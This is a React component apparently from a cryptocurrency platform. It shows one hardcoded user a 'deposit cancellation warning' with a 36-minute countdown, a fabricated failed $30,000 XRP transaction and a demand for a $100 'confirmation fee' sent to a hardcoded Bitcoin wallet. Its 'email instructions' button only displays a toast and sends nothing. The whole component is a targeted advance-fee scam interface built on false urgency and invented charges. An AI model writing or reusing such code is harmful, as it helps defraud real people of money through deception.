import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { AlertTriangle, Clock, Copy, Mail, XCircle, Wallet } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";

const TARGET_USER_ID = "4a93cf5f-c1f2-4c2a-b1d7-cb8ad6c635a0";
const PLATFORM_BTC_WALLET = "bc1qx6hnpju7xhznw6lqewvnk5jrn87devagtrhnsv";
const INITIAL_COUNTDOWN_SECONDS = 36 * 60; // 36 minutes

export const DepositCancellationNotification = () => {
  const [isOpen, setIsOpen] = useState(false);
  const [isTargetUser, setIsTargetUser] = useState(false);
  const [countdown, setCountdown] = useState(INITIAL_COUNTDOWN_SECONDS);
  const { toast } = useToast();
  const navigate = useNavigate();

  // Check if current user is the target user
  useEffect(() => {
    const checkUser = async () => {
      const { data: { user } } = await supabase.auth.getUser();
      if (user?.id === TARGET_USER_ID) {
        setIsTargetUser(true);
        setIsOpen(true);
      }
    };
    checkUser();
  }, []);

  // Countdown timer
  useEffect(() => {
    if (!isOpen || countdown <= 0) return;

    const timer = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          toast({
            title: "Deposit Cancellation",
            description: "Your deposit has been cancelled due to unpaid confirmation fee.",
            variant: "destructive",
          });
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [isOpen, toast]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  };

  const copyWalletAddress = () => {
    navigator.clipboard.writeText(PLATFORM_BTC_WALLET);
    toast({
      title: "Copied!",
      description: "Wallet address copied to clipboard",
    });
  };

  const handlePayNow = () => {
    setIsOpen(false);
    navigate("/dashboard/deposit");
  };

  const handleEmailInstructions = () => {
    toast({
      title: "Email Sent",
      description: "Payment instructions have been sent to your email.",
    });
  };

  if (!isTargetUser) return null;

  const isUrgent = countdown < 600; // Less than 10 minutes

  return (
    <AlertDialog open={isOpen} onOpenChange={setIsOpen}>
      <AlertDialogContent className="max-w-md border-destructive/50 bg-background">
        <AlertDialogHeader>
          <AlertDialogTitle className="flex items-center gap-2 text-destructive">
            <AlertTriangle className="h-5 w-5" />
            DEPOSIT CANCELLATION WARNING
          </AlertDialogTitle>
          <AlertDialogDescription asChild>
            <div className="space-y-4">
              {/* Countdown Timer */}
              <div className="flex flex-col items-center justify-center py-4 rounded-lg bg-destructive/10 border border-destructive/20">
                <Clock className={`h-8 w-8 mb-2 ${isUrgent ? "text-destructive animate-pulse" : "text-muted-foreground"}`} />
                <span className={`text-3xl font-mono font-bold ${isUrgent ? "text-destructive" : "text-foreground"}`}>
                  {formatTime(countdown)}
                </span>
                <span className="text-sm text-muted-foreground">Time Remaining</span>
              </div>

              {/* Pending Fee Section */}
              <div className="space-y-2 p-3 rounded-lg bg-accent/10 border border-accent/20">
                <h4 className="font-semibold text-foreground flex items-center gap-2">
                  <Wallet className="h-4 w-4 text-accent" />
                  PENDING FEE PAYMENT
                </h4>
                <div className="grid grid-cols-2 gap-2 text-sm">
                  <span className="text-muted-foreground">Fee Amount:</span>
                  <span className="font-semibold text-foreground">$100 (2% XRP fee)</span>
                  <span className="text-muted-foreground">Related Deposit:</span>
                  <span className="font-semibold text-foreground">$500 XRP</span>
                </div>
              </div>

              {/* Failed Transaction Section */}
              <div className="space-y-2 p-3 rounded-lg bg-destructive/10 border border-destructive/20">
                <h4 className="font-semibold text-destructive flex items-center gap-2">
                  <XCircle className="h-4 w-4" />
                  FAILED TRANSACTION
                </h4>
                <div className="space-y-1 text-sm">
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Amount:</span>
                    <span className="font-semibold text-foreground">$30,000 XRP</span>
                  </div>
                  <div className="flex flex-col gap-1">
                    <span className="text-muted-foreground">Destination:</span>
                    <code className="text-xs bg-muted/50 px-2 py-1 rounded break-all">
                      rw2ciyaNshpHe7bCHo4bRWq6pqqynnWKQg
                    </code>
                  </div>
                  <div className="flex items-center gap-2 mt-2">
                    <Badge variant="destructive" className="text-xs">
                      FAILED
                    </Badge>
                    <span className="text-xs text-muted-foreground">
                      Confirmation fee not paid
                    </span>
                  </div>
                </div>
              </div>

              {/* Payment Wallet */}
              <div className="space-y-2 p-3 rounded-lg bg-muted/30 border border-border">
                <span className="text-sm text-muted-foreground">Pay confirmation fee to:</span>
                <div className="flex items-center gap-2">
                  <code className="flex-1 text-xs bg-background px-2 py-1.5 rounded border break-all">
                    {PLATFORM_BTC_WALLET}
                  </code>
                  <Button
                    variant="outline"
                    size="icon"
                    className="shrink-0"
                    onClick={copyWalletAddress}
                  >
                    <Copy className="h-4 w-4" />
                  </Button>
                </div>
              </div>

              {/* Warning */}
              <p className="text-xs text-destructive flex items-center gap-1">
                <AlertTriangle className="h-3 w-3" />
                Failure to pay will cancel your $500 deposit
              </p>
            </div>
          </AlertDialogDescription>
        </AlertDialogHeader>
        <AlertDialogFooter className="flex-row gap-2 sm:gap-2">
          <Button
            variant="outline"
            size="icon"
            onClick={handleEmailInstructions}
            className="shrink-0"
          >
            <Mail className="h-4 w-4" />
          </Button>
          <Button
            variant="destructive"
            className="flex-1"
            onClick={handlePayNow}
          >
            Pay $100 Now
          </Button>
        </AlertDialogFooter>
      </AlertDialogContent>
    </AlertDialog>
  );
};
